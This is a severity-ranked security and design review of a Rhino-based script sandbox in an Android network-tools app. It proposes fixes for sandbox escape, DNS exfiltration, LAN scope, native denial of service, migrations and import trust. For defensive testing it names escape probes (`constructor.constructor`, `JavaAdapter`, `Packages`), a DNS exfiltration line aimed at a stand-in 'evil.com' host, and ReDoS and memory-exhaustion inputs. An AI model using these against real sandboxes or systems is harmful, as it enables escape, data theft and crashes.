# Gruff review: tools platform design (2026-10-23)

Hardest first. Read against ToolRunner.kt, ToolId.kt, ToolApplicability.kt.

## BLOCKER

1. **ClassShutter is not the sandbox, host objects are.** "Deny every class" cannot hold because `ctx` is itself a Java object. Any wrapped Kotlin value (list, map, exception) exposes `getClass()` and `javaException`. Fix: build `ctx` only from `ScriptableObject`/`BaseFunction` and copy all returns into plain JS values. Use a `WrapFactory` whose `wrapAsJavaObject` throws, `javaPrimitiveWrap=false`, enhanced Java access off, an empty ClassShutter allow-list, and a sealed global. Ship a hostile suite: `getClass`, `constructor.constructor`, `Function("return this")()`, `__defineGetter__` walks, `JavaAdapter`, `Packages`.

2. **DNS is an exfil channel and the scope check races.** `ctx.dns.lookup("secret.evil.com")` leaks data under `network: "target"`. "Resolve first, then check" is check-then-connect (rebinding, short TTL). Fix: under TARGET, `dns.*` resolves only the target's own name. Resolve once and connect to that exact `InetAddress` (custom Dns and socket factory). Re-run the full scope check on every redirect hop. Reject non-canonical literals (decimal, octal, hex, `[::ffff:a.b.c.d]`).

3. **LAN scope is far too broad.** "Any private address" covers all of 10/8 and 172.16/12, CGNAT, loopback (the phone's own services), link-local, multicast, limited and directed broadcast, IPv6 ULA and fe80. UDP to broadcast or multicast is a reflection tool. Fix: LAN means inside the current NetworkEnv subnet, minus loopback, multicast, broadcast and network address; resolve v6 and v4-mapped forms before checking. `ANY` needs a per-run confirmation, not only an import-time badge.

## MAJOR

4. **Native DoS beats the instruction observer.** It counts interpreter instructions only (and requires interpreted mode). `/(a+)+$/`, `"x".repeat(2**30)` and `new Array(1e9)` run in Java natives and OOM the whole app process. Fix: cap string and array sizes by overriding those builtins, drop `RegExp` or replace it with a step-limited `ctx.regex`, add a watchdog that abandons the run thread. The observer must throw an `Error` subclass that JS `try/finally` cannot swallow.

5. **Synchronous script calls on a shared limited dispatcher.** `gate()` is `suspend`, so you will `runBlocking` on `limitedParallelism(16)`. Sixteen blocked calls, or `http.many` waiting on the same dispatcher, deadlock built-in tools too. Stop cannot interrupt a blocked socket read, and a pause pins a thread. Fix: separate script dispatcher, separate pool for `many`, cancellation closes sockets, every blocking call tied to the run's Job.

6. **ToolRunner is keyed by hostId.** `runs`, `Active`, host-busy and `onFinished(hostId)` all assume a Long. Null-host runs collide and two NONE tools cannot coexist. Fix: key by runId, host-busy only when non-null, test two concurrent NONE runs and a host delete mid-run.

7. **Nullable hostId breaks every join.** Scans queries with INNER JOIN hosts hide null-host runs, export builds rows from the host IP, and cascade delete never reaches them so orphans accumulate. Fix: LEFT JOIN everywhere, a "No device" label, null-safe export, history retention (cap per tool, clear button).

8. **MIGRATION_5_6 may delete findings.** Dropping `tool_runs` with foreign keys on fires ON DELETE CASCADE into findings; `defer_foreign_keys` does not suppress cascade actions. "Findings table untouched" is therefore unproven. Fix: create-copy-rename in the Room-supported way and add a MigrationTestHelper test that seeds findings and asserts counts after.

9. **Import is a trust cliff.** The user sees a script-authored descriptor, never the code. Re-importing the same slug replaces the file on one confirmation, so v1 `target` can become v2 `any`. Fix: diff scope, inputs and sha256 on replace and force re-consent when scope widens, offer "view source", reject version downgrades, label `author` unverified, require https on every URL redirect.

10. **Secrets leak into history.** `optionsJson`, the plain SharedPreferences "last inputs" and export persist everything, including SNMP communities. Fix: `secret: true` text inputs, masked, never persisted or exported.

11. **Findings are attacker-controlled output.** `url` renders tappable links (`intent:`, `file:`, `javascript:`). 1 MB values times 5,000 findings persisted immediately is gigabytes of writes. Fix: http and https only, per-field caps (about 2 KB), a total findings byte cap, insert rate limit.

12. **D8 is a big-bang rewrite of the riskiest code.** Dir-brute depends on calibration, `excusedOnce` pause handling and mid-run `option()` writes. The input types have no multi-select (status codes), list (extensions) or secret type; SNMP needs community and version; Identify-all calls other tools. "Tests green or updated" invites weakening tests. Fix: B1a is a thin adapter wrapping the existing `Tool` classes with golden tests on `optionsJson`; add `multichoice`, `list`, `secret` types; rewrite one tool at a time; migrate saved `DirBruteOptionsStore` values once.

13. **Rhino 1.9.1 is unverified.** Confirm it exists on Maven Central; I cannot from here. Rhino 1.8+ uses newer bytecode and `java.lang.invoke`; AGP desugaring plus API 26 is probably fine but must be proven. 1.7.15 is Java 8 and known-good, but the fallback silently changes language level, so pin the contract and examples to an ES5 subset. Spike checklist: debug and R8-minified release builds, API 26 emulator plus the Pixel, `setOptimizationLevel(-1)` forced (no bytecode generation on dex), R8 keep rules, `Messages.properties` bundled, no `javax.script` or `java.beans` references, APK size and cold-start delta, and the hostile suite from finding 1 plus the finding 4 cases.

## MINOR

14. **Removed tools orphan history.** Removed `user:` keys render as raw strings. Store a display-name snapshot on each run.

15. **Form holes.** Reserve `ip` and `port` as input names. Define what happens to remembered values when a version removes or retypes an input. Specify validation timing, inline errors, Run disabled until valid, caps on label, help and option counts, and what Back does mid-run.

16. **D3 wording.** "No eval of host strings" means nothing: `eval` and `Function` compile script strings anyway. Remove them or say they are allowed.

17. **Budgets are loose.** 20,000 calls with `many(..., 16)` is a flood against one device. Add a per-destination rate through the existing `RateBucket`, count each `many` item as a call, and make the input model IPv6-aware before `Inet4Address` spreads.

## Verdict
- Do not start B2 until findings 1, 2 and 3 are resolved in the spec; they are design gaps, not details.
- Split B1: adapter first, then null-host plus migration with tests, rewrites last.
- Run the Rhino spike (finding 13) before the contract commits to any ES feature.
